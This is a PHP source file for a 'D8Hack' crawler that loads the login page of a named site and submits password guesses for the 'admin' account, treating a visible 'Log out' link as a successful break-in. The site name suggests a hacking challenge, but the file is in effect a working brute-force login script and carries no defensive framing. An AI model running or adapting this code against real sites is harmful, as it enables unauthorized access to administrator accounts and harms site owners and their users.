<?php

/**
 * A crawler.
 */

namespace D8Hack;

use Goutte\Client;
use Symfony\Component\Console\Output\OutputInterface;

/**
 * Defines a class to crawl the hack site.
 *
 * @package D8Hack
 */
class Crawler {

  /**
   * @var \Goutte\Client
   */
  protected $client;

  /**
   * Login form.
   *
   * @var \Symfony\Component\DomCrawler\Form
   */
  protected $form;

  /**
   * Login page.
   *
   * @var \Symfony\Component\DomCrawler\Crawler
   */
  protected $crawler;

  /**
   * Constructs a new crawler.
   *
   * @param \Goutte\Client $client
   */
  public function __construct(Client $client) {
    $this->client = $client;
    $this->crawler = $this->client->request('GET', 'http://d8hack.adyax.com/user');
    $this->form = $this->crawler->selectButton('Log in')->form();
  }

  /**
   * Factory method to create a new crawler.
   *
   * @return static
   */
  public static function create() {
    return new static(new Client());
  }

  /**
   * Attempts login as admin.
   *
   * @param string $password
   *   Password to try.
   * @param \Symfony\Component\Console\Output\OutputInterface $output
   *   Output interface.
   *
   * @return bool|string
   *   FALSE if failed login, otherwise successful password.
   */
  public function doIt($password, OutputInterface $output) {
    $this->form['name'] = 'admin';
    $this->form['pass'] = $password;
    $this->crawler = $this->client->submit($this->form);
    $link = $this->crawler->selectLink('Log out');
    if ($link->count() > 0) {
      return $password;
    }
    $message = $this->crawler->filter('.messages');
    if ($message->count()) {
      $output->writeln($message->text());
    }
    return FALSE;
  }

}
